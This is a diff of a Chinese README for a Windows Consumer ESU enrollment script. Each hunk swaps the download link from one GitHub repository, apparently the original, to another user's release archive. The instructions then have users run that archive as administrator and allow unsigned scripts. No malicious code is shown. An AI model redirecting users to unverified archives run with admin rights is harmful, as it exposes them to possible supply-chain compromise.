@@ -53,7 +53,7 @@ K949M-8N2TP-2H9VY-BVQJR-FC2KM（专业版，只能转成专业版，不能激活
 
 ## 使用方法
 
-1. 点击页面顶部的 **Code > [Download ZIP](https://github.com/abbodi1406/ConsumerESU/archive/refs/heads/master.zip)** 按钮下载脚本  
+1. 点击页面顶部的 **Code > [Download ZIP](https://github.com/svip6688/ESU-registration/archive/refs/tags/V0.0.7.zip)** 按钮下载脚本  
 2. 解压 ZIP 文件中的所有内容  
 3. 右键以管理员身份运行 `Consumer_ESU_Enrollment_run.cmd`  
 
@@ -63,7 +63,7 @@ K949M-8N2TP-2H9VY-BVQJR-FC2KM（专业版，只能转成专业版，不能激活
 
 ### **命令提示符方式：**
 
-1. 点击 **Code > [Download ZIP](https://github.com/abbodi1406/ConsumerESU/archive/refs/heads/master.zip)** 下载  
+1. 点击 **Code > [Download ZIP](https://github.com/svip6688/ESU-registration/archive/refs/tags/V0.0.7.zip)** 下载  
 2. 解压所有文件  
 3. 在解压后的文件夹内以管理员身份打开命令提示符（或用 `cd /d` 命令进入该目录）  
 4. 执行以下命令运行脚本（可带可选参数）  
@@ -79,7 +79,7 @@ Consumer_ESU_Enrollment_run.cmd -Reset
 
 ### **Windows PowerShell 方式：**
 
-1. 点击 **Code > [Download ZIP](https://github.com/abbodi1406/ConsumerESU/archive/refs/heads/master.zip)** 下载  
+1. 点击 **Code > [Download ZIP](https://github.com/svip6688/ESU-registration/archive/refs/tags/V0.0.7.zip)** 下载  
 2. 解压所有文件  
 3. 在解压目录中以管理员身份打开 **PowerShell**  
 4. 临时允许执行未签名脚本：
